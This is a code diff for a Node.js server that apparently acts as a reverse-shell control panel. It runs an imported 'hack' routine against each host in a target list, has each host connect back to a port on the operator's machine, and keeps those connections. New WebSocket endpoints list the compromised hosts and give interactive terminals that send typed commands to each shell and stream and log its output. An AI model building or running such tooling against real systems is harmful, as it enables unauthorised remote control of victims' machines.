@@ -1,8 +1,9 @@
+
 const hack = require('./hack');
 
 var app = require('express')();
+var expressWs = require('express-ws')(app);
 var http = require('http').Server(app);
-var io = require('socket.io')(http);
 
 var path = require('path');
 var _ = require('lodash');
@@ -16,6 +17,7 @@ module.exports = function (config) {
 
     var targets = [];
     var links = [];
+    var logs = [];
     var inrNum = 0;
 
     fs.watchFile(targetListFile, () => {
@@ -39,8 +41,8 @@ module.exports = function (config) {
         targets.push(target)
         inrNum += 1;
         var localPort = config.startLocalPort + inrNum;
+        logs[localPort] = '';
         hack(target, config.localIp + ':' + localPort, (nc) => {
-
             var _target = {
                 host: target,
                 localPort: localPort,
@@ -50,26 +52,53 @@ module.exports = function (config) {
             links.push({
                 ..._target,
                 nc: nc
-            })
+            });
 
-            io.sockets.emit('newTarget', _target);
+            nc.on('data', function (data) {
+                logs[localPort] += data;
+            });
+
         });
     }
 
 
-    io.on('connection', function (socket) {
-        console.log('a user connected');
-
-        socket.emit('data', links.map((link) => {
+    app.ws('/birds', function (ws, req) {
+        var data = links.map((link) => {
             return {
                 key: link.localPort,
                 host: link.host,
+                localPort: link.localPort,
                 linkTime: link.linkTime
             }
-        }))
+        });
+        ws.send(JSON.stringify(data))
+    })
+
+
+    app.ws('/terminals/:pid', function (ws, req) {
+        var pid = parseInt(req.params.pid);
+        var link = _.find(links, { localPort: pid });
+
+        var nc = link && link.nc;
+        if (nc) {
+            var log = logs[pid] || '';
+            ws.send(log);
+            nc.on('data', function (data) {
+                try {
+                    ws.send(data);
+                } catch (ex) {
+                    // The WebSocket is not open, ignore
+                }
+            });
+            ws.on('message', function (msg) {
+                nc.write(msg);
+            });
+        }
+
+
     });
 
-    http.listen(config.port, function () {
+    app.listen(config.port, function () {
         console.log('listening on *:' + config.port);
     });
 }
